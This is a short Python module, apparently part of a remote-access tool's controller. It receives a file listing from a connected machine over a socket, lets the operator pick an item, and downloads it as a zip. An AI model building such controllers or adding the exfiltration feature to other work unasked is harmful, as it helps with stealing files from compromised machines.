import json

CHUNK_SIZE = 4 * 1024
DELIMETER = "<END_OF_RESULTS>"


def receive_file_folder(my_socket):
    print("[+] Receiving Files / Folders")

    full_list = b''  # created an empty byte array

    while True:
        chunk = my_socket.client_conn.recv(CHUNK_SIZE)

        if chunk.endswith(DELIMETER.encode()):
            chunk = chunk[:-len(DELIMETER)]
            full_list += chunk
            break
        full_list += chunk

    # the received file is bytes ie. deserialize it into a dict
    files_dict = json.loads(full_list)

    # printing list of files
    for index in files_dict:
        print("\t", index, "\t", files_dict[index])

    file_index = input("[+] Select the files/folders: ")
    file2download = files_dict[file_index]  # this contains the name
    print("[+] USer selected: ", file2download)
    my_socket.send_data(file2download)
    print("[+] Receiving zipped file")
    zipped_file = file2download + ".zip"

    print("[+] Received name: ", zipped_file)

    my_socket.receive_zipped(zipped_file)
